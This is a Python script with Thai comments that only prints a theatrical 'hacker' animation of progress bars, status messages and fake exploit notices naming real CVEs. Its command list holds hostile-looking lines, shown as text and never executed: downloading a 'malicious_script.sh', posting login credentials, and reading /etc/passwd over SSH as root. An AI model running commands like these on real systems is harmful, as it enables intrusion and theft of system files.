import time
import random
import sys
from colorama import init, Fore

# เริ่มต้นการใช้งาน colorama
init(autoreset=True)

def hacker_loading_screen(duration=5):
    # กำหนดข้อความลำดับขั้นตอน
    steps = [
        "[SYSTEM] Initializing environment variables...",
        "[SYSTEM] Connecting to secure server...",
        "[SECURITY] Verifying access token...",
        "[NETWORK] Establishing encrypted channel...",
        "[FILE] Scanning directories for required assets...",
        "[DATA] Downloading essential libraries...",
        "[COMPILER] Compiling core components...",
        "[SYSTEM] Finalizing configurations...",
        "[SUCCESS] Process completed successfully!"
    ]

    # กำหนดเวลาเริ่มต้น
    start_time = time.time()
    step_index = 0  # ติดตามขั้นตอนปัจจุบัน

    # แสดงการดาวน์โหลดพร้อมกับการแสดงข้อความขั้นตอน
    while time.time() - start_time < duration:
        if step_index < len(steps):  # ถ้ายังมีข้อความในลำดับ
            sys.stdout.write(Fore.GREEN + f"{steps[step_index]}\n")
            sys.stdout.flush()
            step_index += 1
        else:  # แสดงข้อความสุ่มเมื่อหมดลำดับ
            sys.stdout.write(Fore.YELLOW + f"[INFO] {random.randint(0, 9999):04x}: Task in progress...\n")
            sys.stdout.flush()

        # สร้างแอนิเมชันหลอดโหลด
        sys.stdout.write("\r[")
        for i in range(20):  # จำนวนบล็อคในหลอด
            if i < (time.time() - start_time) / duration * 20:  # คำนวณความคืบหน้า
                sys.stdout.write("█")
            else:
                sys.stdout.write("-")
        sys.stdout.write(f"] {int((time.time() - start_time) / duration * 100)}%\n")
        sys.stdout.flush()

        time.sleep(0.3)

    # แสดงข้อความสำเร็จเมื่อครบเวลา
    sys.stdout.write("\n[COMPLETE] All tasks have been executed successfully!\n")
    sys.stdout.flush()

def hacker_download_animation(duration=5):
    # ฟังก์ชันสำหรับแสดงการดาวน์โหลดแบบ hacker
    print(Fore.GREEN + "\nเริ่มการดาวน์โหลด...")

    # เริ่มการดาวน์โหลดพร้อมกับการแสดงการโหลด
    for _ in range(duration):
        sys.stdout.write(Fore.RED + "\r[███████████████████----] " + str(duration) + "s Remaining...")
        sys.stdout.flush()
        time.sleep(1)
        duration -= 1

    sys.stdout.write(Fore.GREEN + "\r[███████████████████████] " + "ดาวน์โหลดเสร็จสิ้น!\n")
    sys.stdout.flush()

def simulate_hacker_commands():
    commands = [
        "ping 192.168.1.1 -t",
        "traceroute example.com",
        "netstat -an | findstr 8080",
        "nslookup 8.8.8.8",
        "curl -O http://example.com/malicious_script.sh",
        "curl -X POST -d 'username=admin&password=1234' http://example.com/login",
        "sudo chmod +x hacktool.sh",
        "ssh root@192.168.0.1 'cat /etc/passwd'",
        "wget --spider --force-html http://example.com/malicious_tool.zip",
        "nmap -p 22 --open 192.168.1.0/24"
    ]
    
    # สุ่มคำสั่งแฮ็คและแสดงผล
    for command in commands:
        sys.stdout.write(Fore.CYAN + f"Executing: {command}\n")
        sys.stdout.flush()
        time.sleep(random.uniform(0.5, 1.5))  # เพิ่มการหน่วงเวลาระหว่างคำสั่ง

def simulate_network_activity():
    activities = [
        "[NETWORK] Connecting to 192.168.0.1...",
        "[NETWORK] Established connection.",
        "[DATA] Receiving payload...",
        "[SYSTEM] Data breach detected.",
        "[SECURITY] Unauthorized access attempt in progress...",
        "[NETWORK] Initiating packet sniffing...",
        "[SYSTEM] Extracting sensitive files...",
        "[SECURITY] Bypassing firewall...",
        "[SYSTEM] Executing remote shell..."
    ]
    
    for activity in activities:
        sys.stdout.write(Fore.YELLOW + f"{activity}\n")
        sys.stdout.flush()
        time.sleep(random.uniform(0.8, 2))  # เพิ่มการหน่วงเวลาแบบสุ่ม

def simulate_exploits():
    exploits = [
        "[EXPLOIT] Exploiting vulnerability in SSH (CVE-2020-15778)...",
        "[EXPLOIT] Exploiting vulnerability in Apache HTTP Server (CVE-2021-41773)...",
        "[EXPLOIT] Exploiting vulnerability in OpenSSL (CVE-2021-3711)...",
        "[EXPLOIT] Buffer overflow attack on target system...",
        "[EXPLOIT] SQL injection attempt on vulnerable database..."
    ]
    
    for exploit in exploits:
        sys.stdout.write(Fore.RED + f"{exploit}\n")
        sys.stdout.flush()
        time.sleep(random.uniform(1.0, 2.5))  # เพิ่มการหน่วงเวลาแบบสุ่ม

def simulate_security_breach():
    sys.stdout.write(Fore.YELLOW + "[ALERT] SECURITY BREACH DETECTED: Unauthorized access...\n")
    sys.stdout.flush()
    time.sleep(1.5)
    
    sys.stdout.write(Fore.RED + "[ALERT] SYSTEM COMPROMISED: Triggering data exfiltration...\n")
    sys.stdout.flush()
    time.sleep(2.0)
    
    sys.stdout.write(Fore.YELLOW + "[ALERT] Access logs being cleared...\n")
    sys.stdout.flush()
    time.sleep(1.0)
    
    sys.stdout.write(Fore.GREEN + "[ALERT] Data exfiltration complete. Sending to external server...\n")
    sys.stdout.flush()
    time.sleep(1.5)

# เรียกใช้ฟังก์ชันที่รวมการดาวน์โหลดและแอนิเมชัน
def run_hacker_simulation():
    print(Fore.GREEN + "เริ่มการดาวน์โหลด...")
    
    # เรียกใช้การโหลดที่มีแอนิเมชันพร้อมกับข้อความ
    hacker_loading_screen(5)  # แสดงแอนิเมชันขั้นตอนการโหลด
    
    # แสดงการแฮ็คและการดาวน์โหลดพร้อมกัน
    hacker_download_animation(5)  # แสดงหน้าต่างดาวน์โหลด
    simulate_hacker_commands()  # แสดงคำสั่งแฮ็ค
    simulate_network_activity()  # แสดงกิจกรรมเครือข่าย
    simulate_exploits()  # จำลองการโจมตีด้วยช่องโหว่
    simulate_security_breach()  # จำลองการละเมิดความปลอดภัย

# เรียกใช้ฟังก์ชันทั้งหมด
run_hacker_simulation()